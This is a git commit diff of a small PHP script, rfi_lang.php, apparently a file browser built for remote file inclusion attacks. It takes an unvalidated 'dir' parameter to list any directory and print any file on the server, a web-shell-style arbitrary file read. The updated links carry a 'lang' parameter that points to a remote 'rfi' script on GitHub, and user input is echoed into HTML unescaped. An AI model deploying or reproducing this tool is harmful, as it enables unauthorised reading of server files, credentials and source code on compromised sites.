cc35c20b1ac4aa3c0831b042dc9bdb3a1065116d
Vivien Chambe <vivien.chambe@live.com>
2025-06-23 17:20:39 +0200

    update

--- rfi_lang.php
+++ rfi_lang.php
@@ -1,18 +1,19 @@
 <?php
-$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
+$path = isset($_GET['dir']) ? $_GET['dir'] : '.';
 
-echo "<h3>Liste des fichiers dans : $dir</h3><ul>";
-
-foreach (scandir($dir) as $file) {
-    echo "<li><a href='?dir=$dir/$file'>$file</a></li>";
-}
-
-echo "</ul>";
-
-if (is_file($dir)) {
-    echo "<h3>Contenu de : $dir</h3><pre>";
-    echo htmlspecialchars(file_get_contents($dir));
+if (is_file($path)) {
+    echo "<h3>Contenu de : $path</h3><pre>";
+    // Affiche le code source proprement
+    echo htmlspecialchars(file_get_contents($path));
     echo "</pre>";
+    exit;
 }
+
+echo "<h3>Contenu du répertoire : $path</h3><ul>";
+foreach (scandir($path) as $file) {
+    $full = $path . '/' . $file;
+    echo "<li><a href='?lang=https://raw.githubusercontent.com/Vivien-Chambe/scripts/main/rfi&dir=$full'>$file</a></li>";
+}
+echo "</ul>";
 ?>
 
